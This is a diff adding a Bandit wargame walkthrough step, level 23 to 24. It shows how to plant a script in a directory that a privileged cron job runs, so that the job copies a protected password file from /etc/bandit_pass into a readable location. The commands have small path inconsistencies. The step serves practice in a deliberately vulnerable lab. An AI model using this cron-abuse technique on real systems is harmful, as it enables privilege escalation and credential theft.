@@ -326,3 +326,37 @@ KEY
 ```
 
 ---
+**LEVEL23->LEVEL24:** Read the cronjob_bandit24.sh bashfile from the same locstion as the previous bashfiles. Make a directory in /tmp and create your own first bash file which writes the contents of the original file containing the key to a new file that you can access. Copy this script to the folder described in the cron bash script and you will see that your bash file has been executed.
+
+```
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 "./$i"
+	rm -f "./$i"
+    fi
+done
+mkdir /tmp/userx
+cd /tmp/userx
+nano script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > tmp/jhalon/pass
+chmod 777 script.sh
+cp script.sh /var/spool/bandit24
+dir -a
+.  ..  pass  script.sh
+cat /tmp/jhalon/pass
+KEY
+```
+
+---
+**LEVEL24->LEVEL25:** 
